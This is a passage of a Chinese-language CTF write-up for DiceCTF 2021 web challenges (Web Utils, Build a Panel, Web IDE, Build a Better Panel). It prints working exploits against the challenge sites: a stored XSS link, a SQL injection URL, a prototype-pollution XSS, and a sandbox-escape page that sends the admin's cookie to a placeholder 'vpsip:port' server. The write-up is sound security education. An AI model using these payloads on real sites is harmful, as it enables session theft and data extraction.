+    <span style="color:#a6e22e">statements</span>.<span style="color:#a6e22e">addData</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">uid</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">type</span>);
+  },
+</code></pre></div><p>这里使用了<code>...req.body</code>作为函数的参数</p>
+<blockquote>
+<p>在nodejs中，连续3个点被称<code>spread operator</code>，作用在函数定义中的参数上，有可变参数的效果，允许函数接收不定个数的参数。在函数内部，将spread operator作用的参数当作数组对待。</p>
+</blockquote>
+<p>而且这里的<code>...req.body</code>参数在<code>type</code>参数后面，这里我们通过post传包括type的json格式的参数，在解析的时候，就可以覆盖掉前面的<code>type:'paste'</code>，从而实现构造一个link类型的，且内容为<code>javascript:alert(1)</code>的数据。找到这一点就很容易了，首先post一个请求，创造link类型的xss数据
+<a href="https://imgchr.com/i/yBRfr4">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBRfr4.png">
+            <img class="mx-auto" alt="yBRfr4.png" src="https://s3.ax1x.com/2021/02/11/yBRfr4.png" />
+        </a>
+    </a>
+然后再去访问对应的地址，譬如这里就是<code>http://web-utils.dicec.tf/view/FfJDXjrM</code>
+
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnigqobycuj31n608y75c.jpg">
+            <img class="mx-auto" alt="7" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnigqobycuj31n608y75c.jpg" />
+        </a>
+    
+成功，下一步就是改alert(1)为打cookie，vps接收flag了
+
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnih57fnj3j31w20jsdkf.jpg">
+            <img class="mx-auto" alt="8" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnih57fnj3j31w20jsdkf.jpg" />
+        </a>
+    
+
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnih5rxqhlj30y80jita2.jpg">
+            <img class="mx-auto" alt="9" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnih5rxqhlj30y80jita2.jpg" />
+        </a>
+    
+
+        <a data-fancybox="gallery" href="https://tva1.sinaimg.cn/large/008eGmZEly1gnih7nu0gcj32i80fee0z.jpg">
+            <img class="mx-auto" alt="10" src="https://tva1.sinaimg.cn/large/008eGmZEly1gnih7nu0gcj32i80fee0z.jpg" />
+        </a>
+    </p>
+<h2 id="build-a-panel">Build a Panel</h2>
+<p>首先，在源码<code>server.js</code>开头看到</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">innerQuery</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO flag SELECT &#39;dice{fake_flag}&#39;`</span>;
+<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">innerQuery</span>);
+</code></pre></div><p>再加上下面大量的sql查询，盲猜这个题就是考察sql注入。测试功能后发现，这个网站有create、edit功能，由于下面这段代码的限制，edit的内容只有符合这三种类型才会显示</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">availableWidgets</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;time&#39;</span>, <span style="color:#e6db74">&#39;weather&#39;</span>, <span style="color:#e6db74">&#39;welcome&#39;</span>];
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/status/:widgetName&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">widgetName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">widgetName</span>;
+
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">availableWidgets</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#a6e22e">widgetName</span>)){
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">widgetName</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;time&#39;</span>){
+            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;now :)&#39;</span>});
+        }<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">widgetName</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;weather&#39;</span>){
+            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;as you can see widgets are not fully functional just yet&#39;</span>});
+        }<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">widgetName</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;welcome&#39;</span>){
+            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;No additional data here but feel free to add other widgets!&#39;</span>});
+        }
+    }<span style="color:#66d9ef">else</span>{
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#39;data&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;error! widget was not found&#39;</span>});
+    }
+});
+</code></pre></div><p>sql语句接收我们输入的地方有3处</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// /panel/widgets 
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`SELECT widgetname, widgetdata FROM widgets WHERE panelid = ?`</span>;
+<span style="color:#75715e">// /panel/add
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (?, ?, ?)`</span>;
+</code></pre></div><p>前两处路由都做了预编译，显然无法注入，于是只能考虑第三处</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/admin/debug/add_widget&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>;
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">queryParams</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">cookies</span>[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#a6e22e">secret_token</span>){
+        <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;panelid&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;widgetname&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">queryParams</span>[<span style="color:#e6db74">&#39;widgetdata&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);`</span>;
+        <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">query</span>, (<span style="color:#a6e22e">err</span>) =&gt; {
+            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>);
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;something went wrong&#39;</span>);
+            }<span style="color:#66d9ef">else</span>{
+                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;success!&#39;</span>);
+            }
+        });
+    }<span style="color:#66d9ef">else</span>{
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
+    }
+});
+</code></pre></div><p>这里只能admin才能进行访问，但这个题目同样有一个admin bot，所以我们只要构造好url让admin bot访问添加数据即可。</p>
+<p>从源码中已知flag在flag表中，所以我们可以这么注入</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">?</span><span style="color:#a6e22e">panelid</span><span style="color:#f92672">=</span><span style="color:#ae81ff">72</span><span style="color:#a6e22e">a8ca36</span><span style="color:#f92672">-</span><span style="color:#a6e22e">fae5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4985</span><span style="color:#f92672">-</span><span style="color:#ae81ff">9742</span><span style="color:#f92672">-</span><span style="color:#a6e22e">b87b53e30222</span><span style="color:#e6db74">&#39;,(select flag from flag),&#39;</span>{<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;type\&#34;:\&#34;time\&#34;</span>}<span style="color:#960050;background-color:#1e0010">&#39;</span>); <span style="color:#f92672">--</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">widgetname</span><span style="color:#f92672">=</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">widgetdata</span><span style="color:#f92672">=</span><span style="color:#a6e22e">a</span>
+</code></pre></div><p>注意这里的panelid换成自己对应的panelid，通过上面的注入，相当于得到了下面的sql语句</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> widgets (panelid, widgetname, widgetdata) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;72a8ca36-fae5-4985-9742-b87b53e30222&#39;</span>, (<span style="color:#66d9ef">select</span> flag <span style="color:#66d9ef">from</span> flag),<span style="color:#e6db74">&#39;{\&#34;type\&#34;:\&#34;time\&#34;}&#39;</span>); <span style="color:#75715e">-- &#39;,&#39;a&#39;,&#39;a&#39;);
+</span></code></pre></div><p>最终用请求的url编码一下就是</p>
+<pre><code>https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=72a8ca36-fae5-4985-9742-b87b53e30222%27,(select%20*%20from%20flag),%27{&quot;type&quot;:&quot;time&quot;}%27);%20--%20&amp;widgetname=a&amp;widgetdata=a
+</code></pre><p>用admin bot发起请求后，在自己的<code>/panel</code>路径下就可以看到flag</p>
+<p><a href="https://imgchr.com/i/yBR7Px">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBR7Px.png">
+            <img class="mx-auto" alt="yBR7Px.png" src="https://s3.ax1x.com/2021/02/11/yBR7Px.png" />
+        </a>
+    </a></p>
+<h2 id="web-ide">Web IDE</h2>
+<p>题目给了一个js代码编辑和运行页面，首先在源码中，很容易发现</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/ide/login&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">password</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+  <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">user</span>) {
+  <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;guest&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">cookie</span>(<span style="color:#e6db74">&#39;token&#39;</span>, <span style="color:#e6db74">&#39;guest&#39;</span>, {
+      <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/ide&#39;</span>,
+      <span style="color:#a6e22e">sameSite</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;none&#39;</span>,
+      <span style="color:#a6e22e">secure</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+    }).<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/ide/&#39;</span>);
+  <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;admin&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">adminPassword</span>)
+      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">cookie</span>(<span style="color:#e6db74">&#39;token&#39;</span>, <span style="color:#e6db74">`dice{</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span><span style="color:#e6db74">}</span><span style="color:#e6db74">}`</span>, {
+        <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/ide&#39;</span>,
+        <span style="color:#a6e22e">sameSite</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;none&#39;</span>,
+        <span style="color:#a6e22e">secure</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
+      }).<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/ide/&#39;</span>);
+    <span style="color:#66d9ef">break</span>;
+  }
+  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">end</span>();
+});
+</code></pre></div><p>所以思路就是获取到admin的cookie</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#39;X-Frame-Options&#39;</span>, <span style="color:#e6db74">&#39;DENY&#39;</span>);
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">next</span>();
+});
+
+<span style="color:#75715e">// sandbox the sandbox
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;/sandbox.html&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#39;Content-Security-Policy&#39;</span>, <span style="color:#e6db74">&#39;frame-src \&#39;none\&#39;&#39;</span>);
+  <span style="color:#75715e">// we have to allow this for obvious reasons
+</span><span style="color:#75715e"></span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">removeHeader</span>(<span style="color:#e6db74">&#39;X-Frame-Options&#39;</span>);
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">next</span>();
+});
+</code></pre></div><p>通过上面的代码限制，我们只能在sandbox.html这里用iframe</p>
+<p>在<code>/ide</code>路由下查看源码，可以看到有一个<code>sanbox.js</code>，代码如下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">safeEval</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">d</span>) =&gt; (
+   <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">data</span>) {
+      <span style="color:#66d9ef">with</span> (<span style="color:#66d9ef">new</span> Proxy(window, {
+         <span style="color:#a6e22e">get</span><span style="color:#f92672">:</span> (<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">p</span>) =&gt; {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">p</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;console&#39;</span>) <span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">log</span> };
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">p</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;eval&#39;</span>) <span style="color:#66d9ef">return</span> window.eval;
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">undefined</span>;
+         }
+      })) 
+      {
+         eval(<span style="color:#a6e22e">data</span>);
+      }
+}).<span style="color:#a6e22e">call</span>(Object.<span style="color:#a6e22e">create</span>(<span style="color:#66d9ef">null</span>), <span style="color:#a6e22e">d</span>);
+</code></pre></div><p>可以看到有个eval，考虑再利用它进行代码执行。</p>
+<p>首先尝试了使用<code>console.log([].constructor.constructor);</code>，发现拿到了<code>function Function() { [native code] }</code></p>
+<p><a href="https://imgchr.com/i/yBm99H">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBm99H.png">
+            <img class="mx-auto" alt="yBm99H.png" src="https://s3.ax1x.com/2021/02/11/yBm99H.png" />
+        </a>
+    </a>
+继续尝试<code>console.log([].constructor.constructor('return eval(1+1)')());</code></p>
+<p><a href="https://imgchr.com/i/yBmK3j">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBmK3j.png">
+            <img class="mx-auto" alt="yBmK3j.png" src="https://s3.ax1x.com/2021/02/11/yBmK3j.png" />
+        </a>
+    </a></p>
+<p>但是由于同源策略限制，不可能直接拿到cookie，还得走sandbox.html</p>
+<p><a href="https://imgchr.com/i/yBm3D0">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBm3D0.png">
+            <img class="mx-auto" alt="yBm3D0.png" src="https://s3.ax1x.com/2021/02/11/yBm3D0.png" />
+        </a>
+    </a></p>
+<p>解决办法就是，在服务器上构造一个没有<code>sandbox=&quot;allow-scripts&quot;</code>这个属性限制的iframe，代码如下:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">body</span>&gt;
+    &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://web-ide.dicec.tf/sandbox.html&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;800&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;400&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+    &lt;<span style="color:#f92672">script</span>&gt;
+      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">xss</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`console.log(window.location)`</span>,
+         <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&#39;&#39;.sub.constructor(&#39;eval(</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">xss</span><span style="color:#e6db74">}</span><span style="color:#e6db74">)&#39;)()`</span>,
+         <span style="color:#a6e22e">frame</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>);
+
+      <span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">e</span>) {
+         <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;loaded&#34;</span>)
+         <span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">contentWindow</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">payload</span>, <span style="color:#e6db74">&#39;*&#39;</span>);
+      });
+   &lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+</code></pre></div><p>在本机服务器上写了这样一个页面，访问后在控制台成功打印了window.location属性，但是存储着flag的cookie只在<code>/ide</code>路由下可见</p>
+<p>所以需要改一下代码执行部分，改成使用window.open打开<code>/ide</code>(此时跟sandbox.html同源)，然后把对应cookie打到vps监听端口即可。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!doctype html&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">body</span>&gt;
+    &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://web-ide.dicec.tf/sandbox.html&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;800&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;400&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">xss</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#e6db74">`eval(&#34;const win = window.open(&#39;/ide&#39;);setTimeout(function(){window.location.href=&#39;http://vpsip:port/?q=&#39;+win.document.cookie},3000)&#34;)`</span>);
+    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`[].constructor.constructor(&#39;eval(atob(\\&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">xss</span><span style="color:#e6db74">}</span><span style="color:#e6db74">\\&#39;))&#39;)()`</span>;
+    <span style="color:#a6e22e">frame</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>);
+    <span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;load&#34;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">e</span>) {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;loaded&#34;</span>)
+        <span style="color:#a6e22e">frame</span>.<span style="color:#a6e22e">contentWindow</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">payload</span>, <span style="color:#e6db74">&#39;*&#39;</span>);
+    });
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>用admin bot访问服务器对应地址即可
+<a href="https://imgchr.com/i/yBnsQs">
+        <a data-fancybox="gallery" href="https://s3.ax1x.com/2021/02/11/yBnsQs.png">
+            <img class="mx-auto" alt="yBnsQs.png" src="https://s3.ax1x.com/2021/02/11/yBnsQs.png" />
+        </a>
+    </a></p>
+<h2 id="build-a-better-panel">Build a Better Panel</h2>
+<p>这个题是Build a Panel的升级版，diff了一下，代码只改变了一点，就是设置cookie的sameSite属性为strict</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">63c63
+&lt;         res.cookie<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;panelId&#39;</span>, newPanelId, <span style="color:#f92672">{</span>maxage: 10800, httponly: true, sameSite: <span style="color:#e6db74">&#39;lax&#39;</span><span style="color:#f92672">})</span>;
+---
+&gt;         res.cookie<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;panelId&#39;</span>, newPanelId, <span style="color:#f92672">{</span>maxage: 10800, httponly: true, sameSite: <span style="color:#e6db74">&#39;strict&#39;</span><span style="color:#f92672">})</span>;
+149c149
+&lt;         res.cookie<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;token&#39;</span>, secret_token, <span style="color:#f92672">{</span>maxage: 10800, httponly: true, sameSite: <span style="color:#e6db74">&#39;lax&#39;</span><span style="color:#f92672">})</span>;
+---
+&gt;         res.cookie<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;token&#39;</span>, secret_token, <span style="color:#f92672">{</span>maxage: 10800, httponly: true, sameSite: <span style="color:#e6db74">&#39;strict&#39;</span><span style="color:#f92672">})</span>;
+</code></pre></div><p>设置cookie的sameSite属性为strict的后，跨站点时，任何情况下都不会发送 Cookie。除此之外，在题目描述中还说明了一个限制:</p>
+<pre><code>NOTE: The admin will only visit sites that match the following regex ^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$
+</code></pre><p>也就是admin这次只能访问<code>/create</code>路由了，于是只能找其他方法绕过。</p>
+<p>首先注意到<code>custom.js</code>中的这段代码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">mergableTypes</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;boolean&#39;</span>, <span style="color:#e6db74">&#39;string&#39;</span>, <span style="color:#e6db74">&#39;number&#39;</span>, <span style="color:#e6db74">&#39;bigint&#39;</span>, <span style="color:#e6db74">&#39;symbol&#39;</span>, <span style="color:#e6db74">&#39;undefined&#39;</span>];
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">safeDeepMerge</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">source</span>) =&gt; {
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">source</span>) {
+        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">mergableTypes</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">mergableTypes</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>])){
+            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">key</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;__proto__&#39;</span>){
+                <span style="color:#a6e22e">safeDeepMerge</span>(<span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>], <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>]);
+            }
+        }<span style="color:#66d9ef">else</span>{
+            <span style="color:#a6e22e">target</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">source</span>[<span style="color:#a6e22e">key</span>];
+        }
+    }
+}
+</code></pre></div><p>循环赋值，并且检查了<code>__proto__</code>关键字，看起来应该有原型链污染，但这里过滤了<code>__proto__</code>这个关键字让我不知道怎么搞了。比赛的时候在这里思路卡死了，后来看到别人说这个<a href="https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md">poc</a>，简单来说，就是可以通过</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;alert(1)&#39;</span>
+</code></pre></div><p>来实现xss，在我们这个题目里，对应的就是构造</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;alert(1)&#39;</span>
+</code></pre></div><p>于是构造</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+	<span style="color:#f92672">&#34;widgetName&#34;</span>: <span style="color:#e6db74">&#34;constructor&#34;</span>,
